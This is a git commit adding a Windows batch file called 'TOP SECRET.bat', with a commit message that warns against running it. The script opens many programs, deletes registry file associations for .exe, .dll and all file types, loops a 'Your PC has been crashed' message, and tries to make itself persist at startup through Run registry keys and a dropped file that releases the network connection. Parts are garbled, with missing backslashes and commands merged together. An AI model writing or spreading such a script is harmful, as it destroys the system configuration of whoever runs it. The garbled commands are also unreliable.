e0d70876c421329a50067fa6785dd336c8c41477
GitHubberooooo <149901927+GitHubberooooo@users.noreply.github.com>
2024-06-02 18:27:27 -0400

    TOP SECRET
    Please do not open the program. It will do the following:
    z fhs uknuvjk ufh vugoielidgj gnxkjfgnib n  uij ndfk

---
+++ TOP SECRET.bat
@@ -0,0 +1,24 @@
+@echo off
+>:(
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+:MESSAGE
+ECHO Your PC has been crashed. Your Dad.
+GOTO MESSAGE
+echo @echo off>c:windowswimn32.bat
+echo break off>c:windowswimn32.bat echo
+ipconfig/release_all>c:windowswimn32.bat
+echo end>c:windowswimn32.batreg add
+hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
+hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
+PAUSE
